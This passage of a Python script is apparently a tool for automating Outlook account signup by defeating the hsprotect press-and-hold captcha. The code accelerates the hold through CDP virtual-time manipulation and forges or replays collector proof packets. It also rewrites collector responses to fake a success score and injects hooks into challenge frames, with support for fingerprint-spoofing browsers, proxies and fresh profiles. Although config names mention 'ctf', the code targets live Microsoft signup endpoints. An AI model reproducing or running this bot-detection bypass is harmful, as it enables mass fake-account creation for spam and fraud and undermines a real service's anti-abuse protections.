                        legacy_short_hold_steps=legacy_short_hold_steps,
                        force_synthetic_final_on_timeout=force_synthetic_final_on_timeout,
                        force_synthetic_final_template_network=force_synthetic_final_template_network,
                        force_synthetic_final_preserve_bfa=force_synthetic_final_preserve_bfa,
                        force_synthetic_final_trigger_signals=force_synthetic_final_trigger_signals,
                        force_synthetic_final_after_hold_ms=force_synthetic_final_after_hold_ms,
                        force_synthetic_final_no_u0=force_synthetic_final_no_u0,
                        min_runtime_hook_ready_frames=min_runtime_hook_ready_frames,
                        min_knp_prestart_ok=min_knp_prestart_ok,
                        require_chctx_runtime_ready=require_chctx_runtime_ready,
                        prehold_hook_guard_retries=prehold_hook_guard_retries,
                        captcha_close_grace_ms=captcha_close_grace_ms,
                        prehold_readiness_gate_ms=prehold_readiness_gate_ms,
                        prehold_loaded_min_age_ms=prehold_loaded_min_age_ms,
                        real_target_wait_ms=real_target_wait_ms,
                    )
                return False
            if (
                int(attempts or 1) > 1
                and not visible_retry_fired
                and int(retry_visible_challenge_after_ms or 0) > 0
                and (time.time() - wait_started) * 1000 >= int(retry_visible_challenge_after_ms or 0)
            ):
                visible_retry_fired = True
                try:
                    _target2, box2 = controller._locate_hold_button(page)
                except Exception:
                    box2 = None
                if box2:
                    print(
                        "[Probe] time_warp_hold: challenge still/again visible after "
                        f"{int(retry_visible_challenge_after_ms)}ms; retrying short hold; "
                        f"remaining={int(attempts) - 1} box={box2}"
                    )
                    return protocol_time_warp_hold(
                        controller,
                        page,
                        out_dir,
                        email,
                        mode,
                        wait_before_ms,
                        wait_after_ms,
                        hold_ms=hold_ms,
                        wall_ms=wall_ms,
                        stop_delay_ms=stop_delay_ms,
                        prewait_ms=prewait_ms,
                        pre_down_dwell_ms=pre_down_dwell_ms,
                        frame_scope=frame_scope,
                        install_mode=install_mode,
                        skip_mid_snapshots=skip_mid_snapshots,
                        attempts=int(attempts) - 1,
                        runtime_hook_js=runtime_hook_js,
                        install_runtime_hook_late=install_runtime_hook_late,
                        retry_visible_challenge_after_ms=retry_visible_challenge_after_ms,
                        finished_stable_ms=finished_stable_ms,
                        abort_on_score1=abort_on_score1,
                        legacy_short_hold_input=legacy_short_hold_input,
                        dense_cdp_hold_input=dense_cdp_hold_input,
                        hybrid_legacy_down_cdp_move_up=hybrid_legacy_down_cdp_move_up,
                        hybrid_legacy_down_cdp_move_legacy_up=hybrid_legacy_down_cdp_move_legacy_up,
                        hybrid_page_move_count=hybrid_page_move_count,
                        legacy_short_hold_steps=legacy_short_hold_steps,
                        force_synthetic_final_on_timeout=force_synthetic_final_on_timeout,
                        force_synthetic_final_template_network=force_synthetic_final_template_network,
                        force_synthetic_final_preserve_bfa=force_synthetic_final_preserve_bfa,
                        force_synthetic_final_trigger_signals=force_synthetic_final_trigger_signals,
                        force_synthetic_final_after_hold_ms=force_synthetic_final_after_hold_ms,
                        force_synthetic_final_no_u0=force_synthetic_final_no_u0,
                        min_runtime_hook_ready_frames=min_runtime_hook_ready_frames,
                        min_knp_prestart_ok=min_knp_prestart_ok,
                        require_chctx_runtime_ready=require_chctx_runtime_ready,
                        prehold_hook_guard_retries=prehold_hook_guard_retries,
                        captcha_close_grace_ms=captcha_close_grace_ms,
                        prehold_readiness_gate_ms=prehold_readiness_gate_ms,
                        prehold_loaded_min_age_ms=prehold_loaded_min_age_ms,
                        real_target_wait_ms=real_target_wait_ms,
                    )
        except Exception:
            pass
        page.wait_for_timeout(350)
    print(f"[Probe] time_warp_hold: timed out waiting after short hold; last_state={last_state}")
    if force_synthetic_final_on_timeout:
        forced = force_synthetic_final_probe(
            controller,
            page,
            template_network=force_synthetic_final_template_network,
            preserve_bfa=force_synthetic_final_preserve_bfa,
            trigger_success_signals=force_synthetic_final_trigger_signals,
            wait_after_ms=min(max(5000, int(wait_after_ms or 0)), 30000),
            force_no_u0=force_synthetic_final_no_u0,
        )
        if forced:
            return True
    return False


def protocol_virtual_time_hold(
    controller,
    page,
    out_dir,
    email,
    mode,
    wait_before_ms,
    wait_after_ms,
    hold_ms=11800,
    real_wait_ms=900,
):
    print(f"[Probe] virtual_time_hold: locating hold button; virtual_hold_ms={hold_ms} real_wait_ms={real_wait_ms}")
    deadline = time.time() + max(1000, wait_before_ms) / 1000
    target, box = None, None
    while time.time() < deadline:
        try:
            target, box = controller._locate_hold_button(page)
            if box:
                break
            state = controller._captcha_finished_or_blocked(page)
            if state == "finished":
                return True
            if state == "blocked":
                return False
        except Exception:
            pass
        page.wait_for_timeout(220)
    if not box:
        print("[Probe] virtual_time_hold: unable to locate hold button")
        return False

    x = box["x"] + box["width"] * 0.385
    y = box["y"] + box["height"] * 0.56
    print(f"[Probe] virtual_time_hold target=({x:.1f},{y:.1f}) box={box}")

    try:
        page.bring_to_front()
    except Exception:
        pass
    try:
        cdp = page.context.new_cdp_session(page)
    except Exception as exc:
        print(f"[Probe] virtual_time_hold: CDP session failed {exc!r}")
        return False

    try:
        try:
            controller._human_move_to(page, x, y)
        except Exception:
            page.mouse.move(x, y)
        page.wait_for_timeout(80)
        page.mouse.down()
        try:
            res = cdp.send("Emulation.setVirtualTimePolicy", {
                "policy": "advance",
                "budget": int(hold_ms),
                "maxVirtualTimeTaskStarvationCount": 100,
            })
            print(f"[Probe] virtual_time_hold advance result={res}")
        except Exception as exc:
            print(f"[Probe] virtual_time_hold advance error: {exc!r}")
        page.wait_for_timeout(max(250, int(real_wait_ms)))
        page.mouse.move(x + 0.25, y - 0.10)
        page.mouse.up()
        try:
            cdp.send("Emulation.setVirtualTimePolicy", {
                "policy": "advance",
                "budget": 1500,
                "maxVirtualTimeTaskStarvationCount": 100,
            })
        except Exception:
            pass
        print("[Probe] virtual_time_hold: input dispatched")
    except Exception as exc:
        try:
            page.mouse.up()
        except Exception:
            pass
        print(f"[Probe] virtual_time_hold input error: {exc!r}")
        return False

    page.wait_for_timeout(1200)
    try:
        path, data_saved = save_probe_state(page, out_dir, email, mode, "after_virtual_time")
        print(f"[Probe] saved after_virtual_time: {path}")
        summarize_probe(data_saved)
    except Exception as exc:
        print(f"[Probe] virtual_time_hold save failed: {exc!r}")

    deadline = time.time() + max(1000, wait_after_ms) / 1000
    while time.time() < deadline:
        try:
            state = controller._captcha_finished_or_blocked(page)
            if state == "finished":
                return True
            if state == "blocked":
                return False
            if state == "retry":
                print("[Probe] virtual_time_hold: challenge requested retry")
                return False
        except Exception:
            pass
        page.wait_for_timeout(350)
    return False


def main():
    parser = argparse.ArgumentParser(description="Runtime hsprotect protocol probe")
    parser.add_argument("--config", default=os.environ.get("OUTLOOK_REGISTER_CONFIG", "config.ctf.protocol_trace.json"))
    parser.add_argument(
        "--proxy",
        default=None,
        help="Override config proxy for this run, e.g. http://127.0.0.1:17890. Empty string disables proxy.",
    )
    parser.add_argument(
        "--cdp-endpoint",
        default=None,
        help="Connect to an already launched browser over CDP, e.g. CloakBrowser's http://127.0.0.1:<port> or ws://... endpoint.",
    )
    parser.add_argument(
        "--raw-cdp-endpoint",
        default=None,
        help="Use this DevTools HTTP endpoint only for raw input helpers; unlike --cdp-endpoint it does not change how the browser is launched.",
    )
    parser.add_argument(
        "--cdp-close-browser",
        action="store_true",
        help="Close the externally connected CDP browser on cleanup. Default keeps it open.",
    )
    parser.add_argument(
        "--use-cloakbrowser",
        action="store_true",
        help="Launch via the installed cloakbrowser package instead of stock Chrome/Patchright.",
    )
    parser.add_argument("--cloak-fingerprint", default=None, help="Optional fixed CloakBrowser fingerprint seed.")
    parser.add_argument("--cloak-human-preset", default="default", choices=["default", "careful"])
    parser.add_argument(
        "--mode",
        choices=[
            "observe_hold",
            "fake_callback",
            "replay_px1200",
            "fast_cdp_hold",
            "synthetic_px1200",
            "time_warp_hold",
            "virtual_time_hold",
            "chctx_score_probe",
            "chctx_score_probe_hooked",
        ],
        default="observe_hold",
    )
    parser.add_argument("--email", default=None)
    parser.add_argument("--password", default=None)
    parser.add_argument("--replay", default=None, help="Probe JSON produced by observe_hold/final for replay_px1200")
    parser.add_argument("--max-replay-events", type=int, default=None)
    parser.add_argument("--fake-functions", default="PX11659,PX764", help="Comma-separated PX API names for fake_callback")
    parser.add_argument("--wait-before-ms", type=int, default=18000)
    parser.add_argument("--wait-after-ms", type=int, default=14000)
    parser.add_argument(
        "--score-probe-stop-after-chctx-ms",
        type=int,
        default=8000,
        help="For chctx_score_probe: wait this long after challenge visibility, then save collector score evidence and stop without pressing captcha.",
    )
    parser.add_argument("--replay-delay-ms", type=int, default=180)
    parser.add_argument("--fast-hold-ms", type=int, default=11800)
    parser.add_argument("--fast-wall-wait-ms", type=int, default=120)
    parser.add_argument("--synthetic-hold-ms", type=int, default=11800)
    parser.add_argument("--time-warp-hold-ms", type=int, default=11800)
    parser.add_argument("--time-warp-wall-ms", type=int, default=180)
    parser.add_argument("--time-warp-stop-delay-ms", type=int, default=350)
    parser.add_argument("--time-warp-prewait-ms", type=int, default=0)
    parser.add_argument(
        "--time-warp-pre-down-dwell-ms",
        type=int,
        default=0,
        help="After time-warp/KNP prestart but before mouseDown, add a bounded hover-jitter dwell. This raises pre-press proof time without increasing physical hold wall_ms.",
    )
    parser.add_argument("--time-warp-attempts", type=int, default=1)
    parser.add_argument(
        "--time-warp-retry-visible-challenge-after-ms",
        type=int,
        default=0,
        help="If attempts remain and the hold challenge is still/again visible after this wait, retry the accelerated hold. 0 disables this extra retry trigger.",
    )
    parser.add_argument(
        "--time-warp-finished-stable-ms",
        type=int,
        default=1800,
        help="Require the challenge to stay gone this long before returning success unless CreateAccount is already observed.",
    )
    parser.add_argument(
        "--abort-on-score1",
        action="store_true",
        help="Best-effort IP-saving guard: if an injected hsprotect frame observes IoIoIo|score|1 before/during hold, stop this attempt instead of continuing to final proof.",
    )
    parser.add_argument("--exact-knp-wait-ms", type=int, default=0)
    parser.add_argument(
        "--exact-knp-fallback-grace-ms",
        type=int,
        default=0,
        help="When prior-qi Knp fallback is already cached, wait this many ms for exact current-qi Knp before falling back; 0 sends via fallback immediately.",
    )
    parser.add_argument(
        "--synthetic-u0-lead-ms",
        type=int,
        default=0,
        help="Maximum real wait after starting synthetic U0 before releasing the delayed final proof; 0 waits for U0 ack.",
    )
    parser.add_argument(
        "--disable-synthetic-u0",
        action="store_true",
        help="Do not insert a synthetic U0 packet before delayed final proof; useful to mimic natural no-U0 W0/final challenge flows.",
    )
    parser.add_argument(
        "--preserve-final-bfa",
        action="store_true",
        help="Do not strip BFA+GkExMiE= from normalized final PX561 proof packets. This mimics ADS-like score|1 success envelopes.",
    )
    parser.add_argument(
        "--early-w0-drain-before-final-ms",
        type=int,
        default=-1,
        help="If >=0, flush queued W0 before sending the final proof, then wait this many ms before the final XHR. This matches accepted traces where W0 and final are near-simultaneous with W0 first.",
    )
    parser.add_argument(
        "--early-w0-drain-after-final-ms",
        type=int,
        default=160,
        help="Delay before flushing queued W0 after the final proof XHR has been sent.",
    )
    parser.add_argument(
        "--delayed-final-hard-extra-ms",
        type=int,
        default=3000,
        help="Hard-timeout margin added after exact Knp wait before forcing delayed final send.",
    )
    parser.add_argument(
        "--skip-mid-snapshots",
        action="store_true",
        help="Do not save before/after time-warp probe snapshots; reduces pre-proof delay for timing-sensitive live tests.",
    )
    parser.add_argument("--time-warp-frame-scope", choices=["challenge", "all"], default="challenge")
    parser.add_argument("--time-warp-install-mode", choices=["early", "late"], default="early")
    parser.add_argument(
        "--time-warp-clock-mode",
        choices=["full", "event", "event_timers", "perf_timers"],
        default="full",
        help="full warps Date/perf/Event/timers; event keeps clocks natural; event_timers accelerates timers; perf_timers warps perf/timers but not Date.",
    )
    parser.add_argument(
        "--normalize-px1200-timing",
        choices=["auto", "on", "off"],
        default="auto",
        help="Payload-level PX1200 timing normalization. auto=on for full clock mode, off for event modes.",
    )
    parser.add_argument(
        "--px1200-timing-profile",
        choices=["default", "natural_long"],
        default="default",
        help="Runtime PX1200 timing profile applied before hsprotect signs/encrypts the proof.",
    )
    parser.add_argument(
        "--replace-px561-from-px1200",
        action="store_true",
        help="When a PX1200 proof has just been generated, replace PX561 collector proof data with that cached internally-signed proof.",
    )
    parser.add_argument(
        "--align-px561-timing-from-px1200",
        action="store_true",
        help="Keep PX561's full 87-key structure but copy core timing fields from the just-generated PX1200/W0c proof.",
    )
    parser.add_argument(
        "--inject-knp-sandbox-event",
        action="store_true",
        help="Generate the crcldu sandbox audit signal early and inject KnpQcG8ZVUI= into matching collector payloads.",
    )
    parser.add_argument(
        "--route-only-hook",
        action="store_true",
        help="Do not install the runtime hook in the signup top frame; inject it only through hsprotect route interception.",
    )
    parser.add_argument(
        "--defer-route-hook-until-proof",
        action="store_true",
        help="Do not route-inject the runtime hook during hsprotect initialization; install it by frame.evaluate only after the hold button is visible.",
    )
    parser.add_argument(
        "--normalize-y1nz-preproof",
        action="store_true",
        help="Route only collector POSTs and normalize ch_ctx=1 Y1NZ fingerprint fields before proof generation; no JS injection.",
    )
    parser.add_argument(
        "--final-proof-normalizer",
        choices=["minimal", "template", "ads_safe", "ads_long", "natural_long", "old_1s", "off"],
        default="minimal",
        help="When --normalize-y1nz-preproof is active, also normalize final PX561 packets. ads_safe preserves natural ADS/BFA-like final proofs and only falls back to ads_long if the raw proof is out of range; minimal preserves live timings/coords and removes retry/click noise; old_1s targets the 20260620 accelerated success cluster; template replays the older static success shape; off only patches Y1NZ.",
    )
    parser.add_argument(
        "--optimistic-final-success",
        action="store_true",
        help="When routing a normalized final PX561 proof, immediately fulfill the collector XHR with a local score|0/result|0 response instead of waiting for the remote collector. Use only after live evidence shows the normalized proof is accepted but the UI times out first.",
    )
    parser.add_argument(
        "--optimistic-w0-success",
        action="store_true",
        help="When routing a W0 proof, fulfill it with local score|0/result|0 without also forcing the final PX561 response.",
    )
    parser.add_argument(
        "--rewrite-final-result-success",
        action="store_true",
        help="After a routed final PX561 collector response, preserve its real _px3/_pxde parts but rewrite score/result to success for the client.",
    )
    parser.add_argument(
        "--trigger-final-success-signals",
        action="store_true",
        help="After a final PX561 result|0 response, additionally invoke best-effort hsprotect success callbacks/postMessages. Default is off so native host flow can submit CreateAccount.",
    )
    parser.add_argument(
        "--defer-final-result-to-w0",
        action="store_true",
        help="Experimental: if final PX561 gets a real result|0, strip it from the final response and fulfill the next W0 for that qi with score|0/result|0, matching natural successful traces.",
    )
    parser.add_argument(
        "--defer-final-result-to-w0-wait-ms",
        type=int,
        default=2500,
        help="When --defer-final-result-to-w0 is enabled and W0 arrives first, wait this long for final result|0 before letting W0 continue.",
    )
    parser.add_argument(
        "--neutral-final-fetch-w0",
        action="store_true",
        help="Experimental: fulfill final PX561 quickly with neutral score|1, then let the next W0 fetch the real collector response instead of synthesizing result|0.",
    )
    parser.add_argument(
        "--neutral-final-merge-w0-success",
        action="store_true",
        help="Experimental: fulfill final PX561 with neutral score|1, fetch the real W0 response, then append score|0/result|0 to that real W0 response.",
    )
    parser.add_argument(
        "--neutral-final-cached-w0-success",
        action="store_true",
        help="Experimental: fulfill final PX561 with neutral score|1, then immediately answer W0 with the last cached real W0 parts plus score|0/result|0.",
    )
    parser.add_argument(
        "--neutral-final-cached-rich-w0-success",
        action="store_true",
        help="Experimental: fulfill final PX561 with cached rich final parts minus result|0, then answer W0 with cached real W0 parts plus score|0/result|0.",
    )
    parser.add_argument(
        "--real-final-neutral-w0-success",
        action="store_true",
        help="Experimental: fetch the real final PX561 response, return its rich parts without result|0, then answer W0 quickly with score|0/result|0.",
    )
    parser.add_argument(
        "--session-cached-rich-final-success",
        action="store_true",
        help="Experimental: first round fetches/caches this session's rich final PX561 parts; later rounds immediately return those rich parts rewritten to score|0/result|0.",
    )
    parser.add_argument(
        "--session-cached-rich-w0-success",
        action="store_true",
        help="Experimental: first round fetches/caches this session's rich final PX561 parts; later rounds return neutral final and answer the following W0 with rich score|0/result|0.",
    )
    parser.add_argument(
        "--session-cached-rich-final-and-w0-success",
        action="store_true",
        help="Experimental: first round fetches/caches this session's rich final PX561 parts; later rounds return rich score|0/result|0 on both final PX561 and the following W0, matching the accepted trace shape more closely.",
    )
    parser.add_argument(
        "--warmup-neutral-then-rich-final-and-w0-success",
        action="store_true",
        help="Experimental: first eligible final PX561 stays neutral to induce the natural reload/W0 path; later rounds return rich score|0/result|0 on both final PX561 and W0.",
    )
    parser.add_argument(
        "--session-cached-rich-initial-w0-delay-ms",
        type=int,
        default=0,
        help="With --session-cached-rich-final-and-w0-success, delay the first same-qi minimal W0 response to mimic the accepted trace's ~2.8s final->W0 response gap while keeping the physical hold short.",
    )
    parser.add_argument(
        "--async-early-cached-rich-w0",
        action="store_true",
        help="Experimental: when W0 arrives before final, keep the actual W0 route pending in a background fulfill until final PX561 has been observed, instead of fulfilling W0 immediately.",
    )
    parser.add_argument(
        "--final-response-delay-ms",
        type=int,
        default=0,
        help="Experimental: delay fulfilling routed PX561 final responses so a follow-up W0 request can be generated while the final XHR is still pending, matching accepted final->W0 request ordering.",
    )
    parser.add_argument(
        "--delay-captcha-close-ms",
        type=int,
        default=0,
        help="Experimental: when captcha_close?status=-1 races a pending/recent final PX561 collector response, suppress that close navigation for this many ms so a late result0 can be consumed first.",
    )
    parser.add_argument(
        "--risk-verify-gate-ms",
        type=int,
        default=0,
        help=(
            "Experimental stable-1s guard: when the post-captcha risk/verify request carries "
            "HumanCaptcha challengeSolution, wait until the final PX561 collector response is decoded "
            "and at least this many ms have elapsed after result|0 before forwarding risk/verify."
        ),
    )
    parser.add_argument(
        "--risk-verify-gate-timeout-ms",
        type=int,
        default=1500,
        help="Maximum total wait budget for --risk-verify-gate-ms before forwarding risk/verify anyway.",
    )
    parser.add_argument(
        "--risk-verify-human-success-age-ms",
        type=int,
        default=0,
        help=(
            "Experimental first-pass guard: after collector/W0 result|0, wait for a fresh "
            "HumanCaptcha_Success telemetry request and require it to be at least this old "
            "before forwarding post-captcha risk/verify."
        ),
    )
    parser.add_argument(
        "--risk-verify-human-success-timeout-ms",
        type=int,
        default=0,
        help="Maximum extra wait for --risk-verify-human-success-age-ms before forwarding risk/verify anyway.",
    )
    parser.add_argument(
        "--risk-verify-challenge-to-continue",
        action="store_true",
        help="Experimental isolator: rewrite the second and later risk/verify HumanCaptcha challenge response to {state:continue} while preserving the live continuationToken.",
    )
    parser.add_argument(
        "--disable-visible-iframe-fallback",
        action="store_true",
        help="Do not press the outer hsprotect iframe rectangle; wait for the real nested role=button to avoid dirty first-attempt click telemetry.",
    )
    parser.add_argument(
        "--legacy-short-hold-input",
        action="store_true",
        help="Use the old 20260620 short-proof input path: page.mouse plus denser pressed jitter instead of CDP Input.dispatchMouseEvent.",
    )
    parser.add_argument(
        "--dense-cdp-hold-input",
        action="store_true",
        help="Use the old dense pressed-jitter cadence while keeping CDP Input.dispatchMouseEvent to preserve a short real wall time.",
    )
    parser.add_argument(
        "--min-runtime-hook-ready-frames",
        type=int,
        default=0,
        help="Before accelerated hold, require at least N scoped frames to have runtime hook + time-warp + KNP prestart helpers installed; abort before mouse input if not ready.",
    )
    parser.add_argument(
        "--min-knp-prestart-ok",
        type=int,
        default=0,
        help="Before mouse down, require at least N scoped frames to accept KNP prestart; abort before consuming the captcha attempt if not ready.",
    )
    parser.add_argument(
        "--require-chctx-runtime-ready",
        action="store_true",
        help="When using prehold runtime/KNP guards, count only iframe.hsprotect challenge frames whose URL contains ch_ctx=1.",
    )
    parser.add_argument(
        "--prehold-hook-guard-retries",
        type=int,
        default=2,
        help="Number of extra reinstall attempts for --min-runtime-hook-ready-frames before aborting.",
    )
    parser.add_argument(
        "--prehold-readiness-gate-ms",
        type=int,
        default=0,
        help=(
            "Before mouse down, wait this many ms for first-challenge readiness "
            "(stable qi, Y1NZ response, captcha asset/load signal, idle collector, ch_ctx frames). "
            "This is a bounded warm-up gate, not a proof rewrite."
        ),
    )
    parser.add_argument(
        "--prehold-loaded-min-age-ms",
        type=int,
        default=0,
        help=(
            "When prehold readiness gate is enabled, require a captured HumanCaptcha_Loaded "
            "signal to be at least this old before mouse down. This targets first-round "
            "result|-1 samples where the visible button is ready but post-load captcha "
            "callbacks are still settling."
        ),
    )
    parser.add_argument(
        "--real-target-wait-ms",
        type=int,
        default=12000,
        help=(
            "When only the text/layout-derived hold rectangle is visible, wait this long "
            "for the real nested hsprotect role=button before aborting guarded short holds."
        ),
    )
    parser.add_argument(
        "--force-synthetic-final-on-timeout",
        action="store_true",
        help="Experimental 1s protocol route: if a short hold times out without natural PX561, synthesize and send U0+final from the current Y1NZ/KNP context.",
    )
    parser.add_argument(
        "--force-synthetic-final-template-network",
        default=None,
        help="Network jsonl containing an accepted PX561 final shape used as the synthetic-final template.",
    )
    parser.add_argument(
        "--force-synthetic-final-preserve-bfa",
        action="store_true",
        help="Keep BFA+GkExMiE= in the forced synthetic final template, matching current ADS-like accepted traces.",
    )
    parser.add_argument(
        "--force-synthetic-final-trigger-signals",
        action="store_true",
        help="After a forced synthetic final gets result|0, also fire best-effort hsprotect success callbacks/postMessages.",
    )
    parser.add_argument(
        "--force-synthetic-final-after-hold-ms",
        type=int,
        default=-1,
        help="If >=0 with --force-synthetic-final-on-timeout, attempt the synthetic U0/final route this many ms after releasing the short hold instead of waiting for the overall captcha timeout.",
    )
    parser.add_argument(
        "--suppress-unforced-final-for-synthetic",
        action="store_true",
        help="When the forced synthetic-final route is armed, answer naturally generated PX561 final packets with a neutral response so they do not race/poison the separate forced final probe.",
    )
    parser.add_argument(
        "--force-synthetic-final-no-u0",
        action="store_true",
        help="For forced synthetic-final probes, do not synthesize/send U0 even if the live short hold did not emit one; use final seq directly after Y1NZ, matching current ADS-like success traces.",
    )
    parser.add_argument(
        "--captcha-close-grace-ms",
        type=int,
        default=0,
        help=(
            "After captcha_close?status=-1, wait this many ms before treating it as terminal. "
            "Useful for old 1s U0/W0-style traces where close=-1 can appear before late CreateAccount."
        ),
    )
    parser.add_argument(
        "--hybrid-legacy-down-cdp-move-up",
        action="store_true",
        help="Use page.mouse only for mousePressed, then dispatch pressed moves and release via raw CDP to avoid AdsPower page.mouse.move blocking.",
    )
    parser.add_argument(
        "--hybrid-legacy-down-cdp-move-legacy-up",
        action="store_true",
        help="Use page.mouse for mousePressed/mouseReleased, and raw CDP only for pressed moves to test whether legacy release is required without page.mouse.move blocking.",
    )
    parser.add_argument(
        "--hybrid-page-move-count",
        type=int,
        default=0,
        help="In hybrid modes, send the first N pressed mouseMoved events through page.mouse before falling back to raw CDP moves.",
    )
    parser.add_argument(
        "--legacy-short-hold-steps",
        type=int,
        default=0,
        help="Override pressed-jitter step count for --legacy-short-hold-input or --hybrid-legacy-down-cdp-move-up; 0 keeps the historical dense cadence.",
    )
    parser.add_argument(
        "--async-raw-cdp-release-ms",
        type=int,
        default=0,
        help="Experimental AdsPower path: after page.mouse down, send mouseReleased through a fresh raw CDP websocket after N ms while any page.mouse.move call is still blocked.",
    )
    parser.add_argument(
        "--hybrid-page-move-for-click",
        action="store_true",
        help="Experimental: for --hybrid-page-move-count budgeted page.mouse moves, call the private mouseMove channel with forClick=true to bypass Playwright drag interception while keeping its page raw-mouse path.",
    )
    parser.add_argument(
        "--hybrid-page-move-no-reply",
        action="store_true",
        help="Experimental: for --hybrid-page-move-count budgeted page.mouse moves, use the private channel send_no_reply fire-and-forget path so Python can schedule release while the move is still processing.",
    )
    parser.add_argument(
        "--async-raw-cdp-release-no-wait",
        action="store_true",
        help="With --async-raw-cdp-release-ms, send mouseReleased on a raw DevTools websocket and close without waiting for the CDP response.",
    )
    parser.add_argument(
        "--oopif-cdp-hold-input",
        action="store_true",
        help="Experimental: send the hold input directly to the hsprotect ch_ctx=1 OOPIF DevTools target instead of routing through the top page target.",
    )
    parser.add_argument(
        "--oopif-cdp-no-wait",
        action="store_true",
        help="With --oopif-cdp-hold-input, fire Input.dispatchMouseEvent without waiting for each CDP response.",
    )
    parser.add_argument(
        "--native-sendinput-hold-input",
        action="store_true",
        help="Experimental Windows-only path: use OS-level SetCursorPos + mouse_event down/move/up for the hold instead of CDP/page.mouse.",
    )
    parser.add_argument("--virtual-hold-ms", type=int, default=11800)
    parser.add_argument("--virtual-real-wait-ms", type=int, default=900)
    parser.add_argument(
        "--manual-captcha",
        action="store_true",
        help="Fill the signup form automatically, then pause at the captcha for manual solving instead of invoking the automated handler.",
    )
    parser.add_argument(
        "--manual-captcha-wait-seconds",
        type=int,
        default=None,
        help="Maximum seconds to wait for the operator to solve the captcha when --manual-captcha is enabled.",
    )
    parser.add_argument(
        "--manual-post-verify-wait-seconds",
        type=int,
        default=None,
        help="Seconds to wait after the captcha iframe disappears before deciding whether the manual solve was blocked.",
    )
    parser.add_argument(
        "--bot-protection-wait-seconds",
        type=float,
        default=None,
        help=(
            "Override config bot_protection_wait for the pre-captcha signup form. "
            "Use a small value only for fast-fill timing experiments; the conservative baseline is 11s."
        ),
    )
    parser.add_argument(
        "--signup-entry-mode",
        choices=["outlook", "msal_authorize"],
        default="outlook",
        help="Entry URL strategy: outlook uses outlook.live.com prompt=create_account; msal_authorize jumps directly to the generated consumer authorize URL.",
    )
    parser.add_argument(
        "--signup-entry-url",
        default=None,
        help="Explicit signup entry URL override for controlled timing experiments.",
    )
    parser.add_argument(
        "--signup-country-label",
        default=None,
        help="Optional exact visible country/region label to select on the DOB page, e.g. 日本 for a Japan IP.",
    )
    parser.add_argument(
        "--no-js-input-fallback",
        action="store_true",
        help="Fail instead of setting the signup email input via DOM JS when trusted keyboard input cannot find the field.",
    )
    parser.add_argument(
        "--signup-fill-mode",
        choices=["ui", "fast_dom", "semi_protocol", "protocol_assist", "protocol_takeover", "protocol_takeover_thin"],
        default=None,
        help=(
            "Pre-captcha form strategy. ui keeps the conservative browser typing path; "
            "fast_dom/semi_protocol writes React-controlled fields directly in the live browser session "
            "and leaves the hsprotect captcha/profile flow unchanged; protocol_takeover is V1 "
            "browser-session protocol takeover up to HumanCaptcha and CreateAccount; "
            "protocol_takeover_thin starts V1 from the earliest canary/uaid bootstrap instead of waiting "
            "for the visible email page."
        ),
    )
    parser.add_argument("--fresh-profile-prefix", default=None, help="Create a temporary config with a fresh user_data_dir under .\\profiles")
    parser.add_argument(
        "--cloak-no-viewport",
        action="store_true",
        help="When using CloakBrowser, do not set a Playwright-emulated viewport; use the native window viewport like open_outlook.py.",
    )
    args = parser.parse_args()
    if args.mode == "chctx_score_probe":
        # Diagnostic mode must keep the page/hsprotect frames pristine: no
        # add_init_script, no route JS injection, no Y1NZ/final rewriting.
        args.route_only_hook = True
        args.defer_route_hook_until_proof = True
        args.normalize_y1nz_preproof = False
        args.inject_knp_sandbox_event = False
        args.abort_on_score1 = False
    if args.rewrite_final_result_success:
        if args.defer_final_result_to_w0:
            print("[Probe] --rewrite-final-result-success overrides --defer-final-result-to-w0")
            args.defer_final_result_to_w0 = False
        if args.optimistic_w0_success:
            print("[Probe] --rewrite-final-result-success overrides --optimistic-w0-success")
            args.optimistic_w0_success = False

    os.environ["OUTLOOK_REGISTER_CONFIG"] = args.config
    data = load_config()
    if args.fresh_profile_prefix:
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        profile = f".\\profiles\\{args.fresh_profile_prefix}-{stamp}"
        data.setdefault("patchright", {})["user_data_dir"] = profile
        data.setdefault("playwright", {})["user_data_dir"] = profile
        runtime_config = Path(f"config.ctf.runtime.{args.fresh_profile_prefix}.{stamp}.json")
        runtime_config.write_text(json.dumps(data, ensure_ascii=False, indent=4), encoding="utf-8")
        os.environ["OUTLOOK_REGISTER_CONFIG"] = str(runtime_config)
        args.config = str(runtime_config)
        data = load_config()
        print(f"[Probe] runtime fresh config={runtime_config} profile={profile}")
    runtime_config_modified = False
    if args.proxy is not None:
        data["proxy"] = str(args.proxy or "")
        runtime_config_modified = True
    if args.cdp_endpoint:
        data.setdefault("patchright", {})["cdp_endpoint"] = args.cdp_endpoint
        data.setdefault("patchright", {})["cdp_keep_open"] = not bool(args.cdp_close_browser)
        runtime_config_modified = True
    if args.use_cloakbrowser:
        data.setdefault("patchright", {})["use_cloakbrowser"] = True
        data.setdefault("cloakbrowser", {})["humanize"] = True
        data.setdefault("cloakbrowser", {})["human_preset"] = args.cloak_human_preset
        if args.cloak_no_viewport:
            data.setdefault("context", {})["viewport"] = None
        if args.cloak_fingerprint:
            data.setdefault("cloakbrowser", {})["fingerprint"] = args.cloak_fingerprint
        runtime_config_modified = True
    if args.manual_captcha:
        data["manual_captcha"] = True
        runtime_config_modified = True
    if args.manual_captcha_wait_seconds is not None:
        data["manual_captcha_wait_seconds"] = int(args.manual_captcha_wait_seconds)
        runtime_config_modified = True
    if args.manual_post_verify_wait_seconds is not None:
        data["manual_post_verify_wait_seconds"] = int(args.manual_post_verify_wait_seconds)
        runtime_config_modified = True
    if args.bot_protection_wait_seconds is not None:
        data["bot_protection_wait"] = max(0, float(args.bot_protection_wait_seconds))
        runtime_config_modified = True
    if args.signup_entry_url:
        data["signup_entry_url"] = str(args.signup_entry_url)
        runtime_config_modified = True
    elif args.signup_entry_mode == "msal_authorize":
        data["signup_entry_url"] = build_signup_msal_authorize_url()
        runtime_config_modified = True
    if args.signup_country_label:
        data["signup_country_label"] = args.signup_country_label
        runtime_config_modified = True
    if args.no_js_input_fallback:
        data["no_js_input_fallback"] = True
        runtime_config_modified = True
    if args.signup_fill_mode:
        data["signup_fill_mode"] = args.signup_fill_mode
        runtime_config_modified = True
    if args.disable_visible_iframe_fallback:
        data.setdefault("captcha", {})["allow_visible_iframe_fallback"] = False
        runtime_config_modified = True
    if runtime_config_modified:
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_prefix = args.fresh_profile_prefix or ("cdp" if args.cdp_endpoint else "manual-captcha")
        runtime_config = Path(f"config.ctf.runtime.{safe_prefix}.manual.{stamp}.json")
